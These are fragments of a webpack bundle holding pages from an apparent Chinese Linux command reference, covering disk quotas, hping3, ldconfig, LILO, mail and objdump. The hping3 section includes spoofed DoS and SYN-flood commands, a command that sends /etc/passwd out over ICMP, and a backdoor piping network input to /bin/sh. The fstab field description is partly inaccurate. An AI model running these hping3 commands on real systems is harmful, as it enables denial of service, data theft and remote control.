1\\n</code></pre><p>说明：<code>/etc/fstab</code>文件的每一行由六个字段组成：</p>\\n<ul>\\n<li>第一个字段：文件系统（分区）的注释（类似卷标）；</li>\\n<li>第二个字段：文件系统的装载点；</li>\\n<li>第三个字段：文件系统类型（磁盘配额只能在ext2文件系统上实现）；</li>\\n<li>第四个字段：装载文件系统是使用的选项，如果只想实现基于用户的磁盘配额，就加入usrquota关键字，只想实现基于组的磁盘配额，就加入grpqouta关键字，如果两者都需要，就全写入，中间可以用逗号分隔。</li>\\n<li>第五个字段：表明该文件系统（分区）是否为只读，如果是0就表示只读，1表示可以读写。</li>\\n<li>第六个字段：表示系统启动执行<a href=\\\"https://philipding.github.io/linux-command/fsck\\\" title=\\\"fsck命令\\\">fsck</a>时检查的顺序。</li>\\n</ul>\\n<p>注意：请特别注意这里的拼写，是usrquota和grpquota，不要写成userquota和groupquota。</p>\\n<p>进入单用户模式，用<a href=\\\"https://philipding.github.io/linux-command/quotacheck\\\" title=\\\"quotacheck命令\\\">quotacheck</a>生成.user或.group文件</p>\\n<p>quotacheck 你的目录</p>\\n<pre><code>example:quotacheck / ; quotacheck /home\\n</code></pre><p>如果单用户模式报错的话<a href=\\\"https://philipding.github.io/linux-command/umount\\\" title=\\\"umount命令\\\">umount</a>你的设备<code>/dev/hda*</code></p>\\n<p>再执行就ok了，重启动系统，如果一切正常的话，quota将开始正常工作。</p>\\n<p><strong>设置用户和组配额的分配量</strong></p>\\n<p>对磁盘配额的限制一般是从一个用户占用磁盘大小和所有文件的数量两个方面来进行的。在具体操作之前，我们先了解一下磁盘配额的两个基本概念：软限制和硬限制。</p>\\n<ul>\\n<li>软限制：一个用户在文件系统可拥有的最大磁盘空间和最多文件数量，在某个宽限期内可以暂时超过这个限制。</li>\\n<li>硬限制：一个用户可拥有的磁盘空间或文件的绝对数量，绝对不允许超过这个限制。</li>\\n</ul>\\n<p><strong>通过edquota直接编辑数据文件：</strong></p>\\n<p>使用编辑配额命令edquota为用户配置定额，在重新启动系统之后，我们假设lanf是需要定额的系统帐户，可以使用如下命令来为用户分配磁盘配额：</p>\\n<pre><code>edquota -u lanf\\n</code></pre><p>这个命令将启动默认文本编辑器（如vi或其他由$EDITOR 环境变量指定的编辑器），其内容如下所示：</p>\\n<pre><code>Quotas for user lanf:\\n/dev/sda5:blocks in use:0,limits(soft = 0,hard = 0)\\ninodes in use:0,limits(soft = 0,hard = 0)\\n</code></pre><p>这表示lanf用户在<code>/dev/sda5</code>分区（该分区已经在usrquota的控制之下）中迄今使用了0个数据块（以K为单位），并且没有设限制（包括软限制soft和硬限制hard），同样，lanf在这个分区也没有任何文件和目录，并且也没有任何软硬限制。如果，我们想对用户进行磁盘容量的限制的话，只需要修改blocks行的limits部分就可以了，注意单位使用的是K。例如要为lanf分配100M磁盘的软限制，400M硬限制，可以使用如下的设置：</p>\\n<pre><code>Quotas for user lanf:\\n/dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800)\\ninodes in use:0,limits(soft = 0,hard = 0)\\n</code></pre><p>同样的，要对文件目录的数量限制可以相应的修改inodes行。我们也可以同时对这两项都作出限制。只需要如下的修改Quotas for user lanf：</p>\\n<pre><code>/dev/sda5:blocks in use:0,limits(soft = 102400,hard = 409800)\\ninodes in use:0,limits(soft = 12800,hard = 51200)\\n</code></pre><p>这表示除了相应的容量的限制外，还对文件/目录的数量做了12800个的软限制和51200个的硬限制。在保存了新的配置后，该用户的磁盘使用就不能超过硬限制。如果用户试图超过这个限制，该操作将被取消，然后得到一个错误信息。但是，如果每个用户都要这么麻烦的设置的话，那这种重复的体力劳动实在有点令人不寒而栗，而且也太浪费时间了。幸好edquota还有个-p参数（prototype）可以对已有的用户设置进行拷贝。例如，我们想对Jack、Tom、Chen三个用户使用和lanf一样的限额配置，可以使用如下的命令：</p>\\n<pre><code>edquota -p lanf -u Jack Tom Chen\\n</code></pre><p>这样一来，这三个用户就被赋予了和lanf一样的磁盘配额。</p>\\n<p>对组的配额，除了edquota命令中对应<code>-u</code>选项的改为<code>-g</code>选项，例如下面对webterm1组的操作：</p>\\n<pre><code>edquota -g webterm1\\n</code></pre><p>实际上，以上的限制只是对用户设定的硬限制在起作用。如果需要使软限制也起作用的话，还需要对用户的软限制设定宽限期，缺省的软限制的宽限期是无穷，这可以使用edquota命令的<code>-t</code>选项来实现。运行下面的命令：</p>\\n<pre><code>edquota -t\\n</code></pre><p>edquota将打开缺省编辑器显示如下内容：</p>\\n<pre><code>[time](https://philipding.github.io/linux-command/time &quot;time命令&quot;) units may be:days,hours,minutes,or seconds\\nGrace period before enforcing soft limits for [users](https://philipding.github.io/linux-command/users &quot;users命令&quot;):\\n/dev/sda5:block grace period:0 days,[file](https://philipding.github.io/linux-command/file &quot;file命令&quot;) grace period:0 days\\n</code></pre><p>可以使用天、小时、分、秒为单位来设定宽限期。例如，在下面这个例子中，磁盘空间限制的宽限期为两天，而文件数量限制的宽限期只有6个小时。</p>\\n<pre><code>Time units may be:days,hours,minutes,or seconds\\nGrace period before enforcing soft limits for users:\\n/dev/sda5:block grace period:2 days,file grace period:6 hours\\n</code></pre><p><strong>通过setquota工具加入：</strong></p>\\n<p>比如加入用户bye2000的磁盘配额，执行以下命令：</p>\\n<pre><code>setquota –u / 2000 2500 100 110 bye2000\\n</code></pre><p>以下是setquota命令用法的简单描述：</p>\\n<pre><code>setquota [ -u|-g ] 装载点 软块数 硬块数 软文件数 硬文件数 用户名/组名\\n</code></pre><p><strong>查看用户磁盘使用情况</strong></p>\\n<p>要查明某一个用户使用了多少磁盘空间，例如lanf，可以使用如下的命令：</p>\\n<pre><code>quota -u lanf\\n</code></pre><p>显示：</p>\\n<pre><code>Disk quotas for user lanf(uid 503):\\nFilesystem blocks quota limit grace file quota limit grace\\n/dev/sda5 3 102400 409800 1 12800 51200\\n</code></pre><p>同样，可以使用<code>quota -g groupname</code>命令来参看某个组的磁盘使用情况。</p>\\n<p>注意：</p>\\n<ol>\\n<li>如果该用户没有配置磁盘限额的话，输出显示<code>Disk quotas for user hujm (uid 503): none</code></li>\\n<li>如果不带任何参数运行quota的话，查看的是你自己的配额使用情况。</li>\\n</ol>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./command/edquota.md\n// module id = 156\n// module chunks =

id=\\\"hping3-\\\">Hping3功能</h3>\\n<p>Hping3主要有以下典型功能应用：</p>\\n<h4 id=\\\"-\\\">防火墙测试</h4>\\n<p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href=\\\"http://0daysecurity.com/articles/hping3_examples.html\\\">http://0daysecurity.com/articles/hping3_examples.html</a></p>\\n<p>测试防火墙对ICMP包的反应、是否支持<a href=\\\"https://philipding.github.io/linux-command/traceroute\\\" title=\\\"traceroute命令\\\">traceroute</a>、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p>\\n<pre><code>hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10\\n</code></pre><h4 id=\\\"-\\\">端口扫描</h4>\\n<p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p>\\n<pre><code>hping3 -I eth0  -S 192.168.10.1 -p 80\\n</code></pre><p>其中<code>-I eth0</code>指定使用eth0端口，<code>-S</code>指定TCP包的标志位SYN，<code>-p 80</code>指定探测的目的端口。</p>\\n<p>hping3支持非常丰富的端口探测方式，<a href=\\\"https://philipding.github.io/linux-command/nmap\\\" title=\\\"nmap命令\\\">nmap</a>拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。</p>\\n<h4 id=\\\"idle-\\\">Idle扫描</h4>\\n<p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p>\\n<p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p>\\n<h4 id=\\\"-\\\">拒绝服务攻击</h4>\\n<p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p>\\n<pre><code>hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000\\n</code></pre><p>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p>\\n<h4 id=\\\"-\\\">文件传输</h4>\\n<p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>\\n<pre><code>hping3 192.168.1.159--listen signature --safe  --icmp\\n</code></pre><p>监听ICMP包中的签名，根据签名解析出文件内容。</p>\\n<p>在发送端使用签名打包的ICMP包发送文件：</p>\\n<pre><code>hping3 192.168.1.108--icmp ?d 100 --sign signature --[file](https://philipding.github.io/linux-command/file &quot;file命令&quot;) /etc/[passwd](https://philipding.github.io/linux-command/passwd &quot;passwd命令&quot;)\\n</code></pre><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>\\n<h4 id=\\\"-\\\">木马功能</h4>\\n<p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与<a href=\\\"https://philipding.github.io/linux-command/nc_netcat\\\" title=\\\"netcat命令\\\">netcat</a>的后门功能类似。</p>\\n<p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>\\n<p>在木马启动端：</p>\\n<pre><code>hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh\\n</code></pre><p>在远程控制端：</p>\\n<pre><code>echo [ls](https://philipding.github.io/linux-command/ls &quot;ls命令&quot;) &gt;[test](https://philipding.github.io/linux-command/test &quot;test命令&quot;).cmd\\nhping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd\\n</code></pre><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>\\n<p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>\\n\";\n\n\n//////////////////\n// WEBPACK

等协议的私有网络。这样一来，所有的内部主机都可以拥有公网 IP 而直接连接到互联网，也就同时暴露于互联网上的各种威胁之中了。那么，如何配置 IPv6 防火墙使其默认将除了 ping6 请求之外的所有输入数据包都丢弃呢？可以使用<a href=\\\"http://tools.ietf.org/html/rfc4193\\\">FC00::/7</a> 前缀来标识本地 IPv6

CONF：此选项指定动态链接库的配置文件为CONF，系统默认为/etc/ld.so.conf。\\n-C CACHE：此选项指定生成的缓存文件为CACHE，系统默认的是/etc/ld.so.cache，此文件存放已排好序的可共享的动态链接库的列表。\\n-r ROOT：此选项改变应用程序的根目录为ROOT（是调用[chroot](https://philipding.github.io/linux-command/chroot &quot;chroot命令&quot;)函数实现的）。选择此项时，系统默认的配置文件/etc/ld.so.conf，实际对应的为ROOT/etc/ld.so.conf。如用-r /usr/zzz时，打开配置文件/etc/ld.so.conf时，实际打开的是/usr/zzz/etc/ld.so.conf文件。用此选项，可以大大增加动态链接库管理的灵活性。\\n-l：通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的连接，选择此项时，将进入专家模式，需要手工设置连接，一般用户不用此项。\\n-p或--print-cache：此选项指示ldconfig打印出当前缓存文件所保存的所有共享库的名字。\\n-c

href=\\\"https://philipding.github.io/linux-command/mysql\\\" title=\\\"mysql命令\\\">mysql</a>到<code>/usr/local/mysql</code>，mysql有一大堆library在<code>/usr/local/mysql/lib</code>下面，这时就需要在<code>/etc/ld.so.conf</code>下面加一行<code>/usr/local/mysql/lib</code>，保存过后ldconfig一下，新的library才能在程序运行时被找到。</li>\\n<li>如果想在这两个目录以外放lib，但是又不想在<code>/etc/ld.so.conf</code>中加东西（或者是没有权限加东西）。那也可以，就是<a href=\\\"https://philipding.github.io/linux-command/export\\\" title=\\\"export命令\\\">export</a>一个全局变量LD_LIBRARY_PATH，然后运行程序的时候就会去这个目录中找library。一般来讲这只是一种临时的解决方案，在没有权限或临时需要的时候使用。</li>\\n<li>ldconfig做的这些东西都与运行程序时有关，跟编译时一点关系都没有。编译的时候还是该加-L就得加，不要混淆了。</li>\\n<li>总之，就是不管做了什么关于library的变动后，最好都ldconfig一下，不然会出现一些意想不到的结果。不会花太多的时间，但是会省很多的事。</li>\\n<li>再有，诸如libdb-4.3.so文件头中是会含有库名相关的信息的（即含“libdb-4.3.so”，可用strings命令察看），因此仅通过修改文件名以冒充某已被识别的库（如libdb-4.8.so）是行不通的。为此可在编译库的Makefile中直接修改配置信息，指定特别的库名。</li>\\n</ol>\\n\";\n\n\n//////////////////\n//

LILO（并可以将机器引导到新的 Linux 安装）。</p>\\n<p>要将现有的 Linux 迁移到 LILO，首先必须获得最新版本的 LILO（见 参考资料）。在做任何其他事情之前，建议您确保在手边拥有一张 Linux 引导盘 —— 如果偶而弄错了某些地方，它可以提供很大的帮助，能够恢复到初始的 Linux 配置！将 LILO 安装到系统中之后，让它接管 MBR 非常简单。以 root 用户身份输入：</p>\\n<pre><code>/sbin/lilo -v -v\\n</code></pre><p>这将使用当前的 LILO 默认值，抹去 MBR 中当前所有内容。不过，请阅读 配置 LILO，以确保能够按预期引导起来。也要注意，如果想要在同一机器上运行 Windows 和 Linux，那么应该先安装 Windows OS，然后再安装 Linux OS，这样，在 Linux 安装中所选择的引导加载程序就不会被 Windows 引导加载程序所覆盖。与 Linux 引导加载程序不同，多数 Window 引导加载程序不支持引导 Linux。如果已经先安装了 Linux，那么只需要自己创建一张 Linux 引导盘，这样就可以在安装完 Windows 之后，回到 Linux 安装中并重写 MBR。</p>\\n<p><strong>配置 LILO</strong></p>\\n<p>LILO 的配置都是通过位于 /etc/lilo.conf 的一个配置文件来完成的。清单 1 给出了一个示例配置，使用的是我的家用机器，支持 Linux 和 Windows 机器的双重引导。了解我的工作站的基本配置，就可以想像出这些配置是如何与实际机器相关联的：</p>\\n<p>主 HDD（物理磁盘 1）上安装了 Windows XP（最初机器上只有它）。在 Linux 术语中，这个 HDD 是 /dev/hda（在 <a href=\\\"https://philipding.github.io/linux-command/grub\\\" title=\\\"grub命令\\\">grub</a> 术语中是 hd0,0）。</p>\\n<p>从 HDD（物理磁盘 2）上安装了 Red Hat Linux；root 分区位于这个硬盘驱动器的第三个分区，即 /dev/hdb3（在 GRUB 术语中是 hd1,3）。</p>\\n<p>lilo.conf 示例文件：</p>\\n<pre><code>boot=/dev/hda\\nmap=/boot/map\\n[install](https://philipding.github.io/linux-command/install &quot;install命令&quot;)=/boot/boot.b\\nprompt\\ntimeout=100\\ncompact\\ndefault=Linux\\nimage=/boot/vmlinuz-2.4.18-14\\n    label=Linux\\n    root=/dev/hdb3\\n    [read](https://philipding.github.io/linux-command/read &quot;read命令&quot;)-only\\n    password=linux\\nother=/dev/hda\\n    label=WindowsXP\\n</code></pre><p>配置文件选项说明：</p>\\n<ul>\\n<li>boot= 行告诉 LILO 在哪里安装引导加载程序。在上面的示例中，将把它安装到第一块硬盘的 MBR。也可以选择将 LILO 安装到 /dev/hdb3（示例中的 Linux 分区），这样需要向 /dev/hda 安装另一个引导加载程序，并令其指向 LILO 引导加载程序；然后只需要让 LILO 作为二级引导加载程序。通常，引导加载程序应该位于 /dev/hda。还可以将这个参数指向软盘驱动器（最常见的是 /dev/fd0），来制做 LILO 软盘引导磁盘。</li>\\n<li>map= 指向引导期间 LILO 内部使用的映射文件。当使用 /sbin/lilo 命令安装 LILO 时， 它会自动生成这个文件，其中包含有描述符表（还有其他内容）。建议不要改动这个文件！</li>\\n<li>install= 是 LILO 在引导过程中内部使用的文件之一。它同时包含有引导加载程序的主要部分和二级部分。boot.b 文件的 一个片段被写入到 MBR（引导加载程序的主要部分），它会指向那个映射，接下来指向二级引导加载程序。同样，不要改动它！</li>\\n<li>prompt= 告诉 LILO 使用用户界面（本例中给出了两个选择 —— Linux 和 WindowsXP）。除了使用 prompt/user 界面以外，在适当情况下还可以为 Linux 内核等指定具体的参数。如果不在配置文件中指定此选项，那么 LILO 将引导到 默认的 OS，不发生任何用户交互，也不会等待。（但是请注意，如果在引导时按下了 SHIFT，那么还是可以得到提示，当不想把 引导加载程序暴露给普通用户时，这非常有用）。</li>\\n<li>timeout= 是引导提示在自动引导默认 OS（本例中是 Linux）之前的等待时间（以十分之一秒为单位）。 如果在 lilo.conf 没有指定 prompt，那么这个参数就会被忽略。</li>\\n<li>compact 选项可以大大加速引导过程，它会将连续的读磁盘的请求合并为一个单独的请求。不过，这可能是 一件祸福参半的事情，因为我在论坛上看到过很多贴子提到了关于此选项的问题。当希望从软盘引导时，这个选项尤其有用。</li>\\n<li>default= 选项告诉 LILO 默认使用哪个映像进行引导，比如在等待超时之后。这与 lilo.conf 文件中的某个映像的 标签相关联。如果没有在配置文件中指定此选项，那么它将引导文件中指定的第一个映像。</li>\\n<li>对于允许用户引导到的每一个 Linux 版本，都应该指定 image= 及以下三个选项。image 选项指定希望 引导到的内核版本。</li>\\n<li>label= 标明了在运行期间希望能够从用户界面引导的不同 OS。另外，这个标签用于指定引导的默认 OS。 （注意：标签名称中避免出现空格；否则，引导那个文件时会出现无法预期的错误。）</li>\\n<li>root= 告诉 LILO OS 文件系统实际所在的位置。在我们的示例中为 /dev/hdb3，即第二块硬盘上的第三个分区。</li>\\n<li>read-only 告诉 LILO 以只读的方式初始引导到文件系统。OS 一旦完全引导起来，就会以读写方式挂载。</li>\\n<li>password= 允许您为将要引导到的特定 OS 设置口令。不幸的是，这个口令是以可读文本的方式保存在 lilo.conf 文件中，所以，所有人都能够读取它。如果需要，还可以对想要引导自的每个操作系统设置口令（在我们的示例中，只为 Linux 的引导 设置了一个口令）。</li>\\n<li>other= 的动作类似于 image 和 root 选项的组合，但是用于除了 Linux 以外的其他操作系统。 在我们的示例中，它告诉 LILO 到哪里去找到 Windows OS（位于第一块硬盘的第一个分区）。如果先安装 Windows，后安装 Linux，通常会是这样。</li>\\n<li>label= 与所有其他 label 选项相同。</li>\\n</ul>\\n<p>在 lilo.conf 文件中可以使用很多其他参数，不过清单 1 中的参数就足以让机器可用了。要获得关于 lilo.conf 的这些以及其他参数的 进一步资料，请参考手册页（<a href=\\\"https://philipding.github.io/linux-command/man\\\" title=\\\"man命令\\\">man</a> lilo.conf）。由于在引导时不会读取 lilo.conf，所以，当这个文件有改动时，需要“更新”MBR。 如果不完成此步骤就重新引导，那么对 lilo.conf 的修改不会在启动中反映出来。与先前将 LILO 写入 MBR 类似，需要运行：</p>\\n<pre><code>/sbin/lilo -v -v\\n</code></pre><p><code>-v -v</code>标记会为您给出非常详细的输出。当像我们那样运行 LILO 时，有很多参数可以指定。 参阅手册页以获得更进一步的信息（man lilo）。</p>\\n<p><strong>初始引导过程</strong></p>\\n<p>当 LILO 初始引导时，它会按次序打印出每个字母 —— L-I-L-O。如果所有字母都显示出来，那么第一阶段引导就成功了。缺少任何内容 都表示出现了问题：</p>\\n<p>L：第一阶段引导加载程序已经被加载。如果 LILO 停止在这里，那么是在引导第二阶段引导加载程序时出现了问题。这通常会伴随有一个错误代码。 在这个阶段的常见问题是介质问题，或者在 lilo.conf 文件中指定了不正确的磁盘参数。</p>\\n<p>LI：第二阶段引导加载程序已经被加载。LILO 在此处停止表示第二阶段引导加载程序不能被执行。同样，这可能是因为出现了与只显示 L 类似的问题： 正在加载，或者因 boot.b 文件被破坏、移动或删除而不能加载。</p>\\n<p>LIL：第二阶段引导加载程序正在被执行。此时，可能会再次出现介质问题，或者映射文件（如 lilo.conf 文件中所指定的）在寻找描述符表时 可能会出现问题。</p>\\n<p>LIL?：加载到与上面相同的阶段。这通常意味着加载第二阶段引导加载程序使用了错误的地址，最常见的原因是 boot.b 所在的位置与 lilo.conf 文件所指定的不同。</p>\\n<p>LIL-：加载到与上面相同的阶段。加载描述符表时出现问题，最常见的原因是描述符表错误。</p>\\n<p>LILO：LILO 成功被加载，没有出现任何错误。</p>\\n<p><strong>引导时的附加配置</strong></p>\\n<p>LILO 被成功加载后，将看到 LILO 提示符。还是使用前面的示例 lilo.conf 文件，此时将有两个选择，可能对 LILO 新手来说并不直观。首先，可以 让 LILO 超时（10 秒后），这将引导<code>/dev/hdb3</code>，即 Linux 分区。另外，可以按下 TAB 键，这将列出将要引导的操作系统选项。在我们的示例 lilo.conf 中， 将得到的选项是 “Linux” 和 “Windows”。输入哪一个，就会引导到哪个 OS。指定加载 Linux 选项，会提示输入一个口令，在本例中是 linux。如果输入的口令有误，则会返回 LILO 提示符。</p>\\n<p>不幸的是，LILO 不支持引导期间的交互式配置，所以，只能在 lilo.conf 中或者运行<code>/sbin/lilo</code>时指定选项。</p>\\n<p>关于第一次尝试 LILO 的最后一点建议是：我发现使用软盘引导磁盘比使用硬盘实现 LILO 配置更为安全。为此，必须在 lilo.conf 文件中使用<code>boot=/dev/fd0</code>替换<code>boot=/dev/hda</code>。那样，如果弄乱了lilo.conf文件 中的任何配置，都可以取出引导磁盘并像先前一样引导到 Linux。当使用软盘进行引导一切正常以后，可以将lilo.conf修改回<code>boot=/dev/hda</code>，然后最后一次运行<code>/sbin/lilo</code>来上传修改。</p>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n// ./command/lilo.md\n// module id = 271\n//

href=\\\"https://philipding.github.io/linux-command/sendmail\\\" title=\\\"sendmail命令\\\">sendmail</a>来进行邮件发送的，因此我们可以在mail命令中使用sendmail的参数进行配置，比如我想使用特定的发件人发送邮件，可以使用如下命令：</p>\\n<pre><code>mail -s &quot;Hello from linuxde.net with sender&quot; admin@linuxde.net -- -f user@linuxde.net&lt;mail.txt\\n</code></pre><p>上面的命令中，我们使用了– -f user@linuxde.net这样的参数，这是sendmail的选项，其中-f表示邮件的发送人邮件地址。</p>\\n<p>很多情况下，我们也需要使用邮件来发送附件，在linux下使用mail命令发送附件也很简单，不过首先需要安装uuencode软件包，这个程序是对二进制文件进行编码使其适合通过邮件进行发送，在CentOS上安装该软件包如下：</p>\\n<pre><code>[yum](https://philipding.github.io/linux-command/yum &quot;yum命令&quot;) [install](https://philipding.github.io/linux-command/install &quot;install命令&quot;) sharutils\\n</code></pre><p>安装完成后我们就可以来进行附件的发送了，使用如下命令：</p>\\n<pre><code>uuencode [test](https://philipding.github.io/linux-command/test &quot;test命令&quot;).txt test | mail -s &quot;hello,see the attachement&quot; admin@linuxde.net&lt;mail.txt\\n</code></pre><p>完成后就可以把text.txt文件作为邮件的附件发送出去了。uuencode有两个参数，第一个是要发送的文件，第二个是显示的文件名称。</p>\\n<p>这里我主要介绍的是在CentOS下使用mail发送电子邮件的一些使用方法，需要的要求是你的linux必须安装了sendmail并开启了，同时保证可以连接外网。另外，文章中提到的命令本人都经过亲自测试，保证完全可用，不过你需要将命令中的电子邮件地址换成自己的电子邮件地址。</p>\\n\";\n\n\n//////////////////\n//

个设备号又分为主设备号和次设备号。主设备号用来区分不同种类的设备，而次设备号用来区分同一类型的多个设备。对于常用设备，Linux有约定俗成的编 号，如硬盘的主设备号是3。</p>\\n<p>Linux为所有的设备文件都提供了统一的操作函数接口，方法是使用数据结构struct file_operations。这个数据结构中包括许多操作函数的指针，如open()、close()、<a href=\\\"https://philipding.github.io/linux-command/read\\\" title=\\\"read命令\\\">read</a>()和<a href=\\\"https://philipding.github.io/linux-command/write\\\" title=\\\"write命令\\\">write</a>()等，但由于外设 的种类较多，操作方式各不相同。Struct file_operations结构体中的成员为一系列的接口函数，如用于读/写的read/write函数和用于控制的ioctl等。</p>\\n<p>打开一个文件就是调用这个文件file_operations中的open操作。不同类型的文件有不同的file_operations成员函数，如普通的磁盘数据文件， 接口函数完成磁盘数据块读写操作；而对于各种设备文件，则最终调用各自驱动程序中的I/O函数进行具体设备的操作。这样，应用程序根本不必考虑操作的是设 备还是普通文件，可一律当作文件处理，具有非常清晰统一的I/O接口。所以file_operations是文件层次的I/O接口。</p>\\n\";\n\n\n//////////////////\n// WEBPACK FOOTER\n//

\\n\\n-b bfdname \\n--target=bfdname \\n指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： \\n\\nobjdump -b oasys -m vax -h fu.o \\n显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 \\n\\n-C \\n--demangle \\n将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 \\n\\n--debugging \\n-g \\n显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被[readelf](https://philipding.github.io/linux-command/readelf &quot;readelf命令&quot;) -[w](https://philipding.github.io/linux-command/w &quot;w命令&quot;)支持。 \\n\\n-e \\n--debugging-tags \\n类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 \\n\\n--disassemble \\n-d \\n从objfile中反汇编那些特定指令机器码的section。 \\n\\n-D \\n--disassemble-all \\n与 -d 类似，但反汇编所有section. \\n\\n--prefix-addresses \\n反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 \\n\\n-EB \\n-EL \\n--endian={big|little} \\n指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. \\n\\n-f \\n--[file](https://philipding.github.io/linux-command/file &quot;file命令&quot;)-headers \\n显示objfile中每个文件的整体头部摘要信息。 \\n\\n-h \\n--section-headers \\n--headers \\n显示目标文件各个section的头部摘要信息。 \\n\\n-H \\n--[help](https://philipding.github.io/linux-command/help &quot;help命令&quot;) \\n简短的帮助信息。 \\n\\n-i \\n--[info](https://philipding.github.io/linux-command/info &quot;info命令&quot;) \\n显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 \\n\\n-j name\\n--section=name \\n仅仅显示指定名称为name的section的信息 \\n\\n-l\\n--line-numbers \\n用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-[ld](https://philipding.github.io/linux-command/ld &quot;ld命令&quot;)和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \\n\\n-m machine \\n--architecture=machine \\n指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. \\n\\n--reloc \\n-r \\n显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 \\n\\n--dynamic-reloc \\n-R \\n显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 \\n\\n-s \\n--full-contents \\n显示指定section的完整内容。默认所有的非空section都会被显示。 \\n\\n-S \\n--source \\n尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 \\n\\n--show-raw-insn \\n反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 \\n\\n--no-show-raw-insn \\n反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 \\n\\n--start-address=address \\n从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 \\n\\n--stop-address=address \\n显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 \\n\\n-t \\n--syms \\n显示文件的符号表入口。类似于[nm](https://philipding.github.io/linux-command/nm &quot;nm命令&quot;) -s提供的信息 \\n\\n-T \\n--dynamic-syms \\n显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 \\n\\n-V \\n--version \\n版本信息 \\n\\n--all-headers \\n-x \\n显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 \\n\\n-z \\n--disassemble-zeroes \\n一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 \\n\\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。\\n</code></pre><h3 id=\\\"-\\\">实例</h3>\\n<p>首先，在给出后面大部分测试所基于的源代码以及编译指令。 源代码如下： </p>\\n<pre><code>[root@localhost [test](https://philipding.github.io/linux-command/test

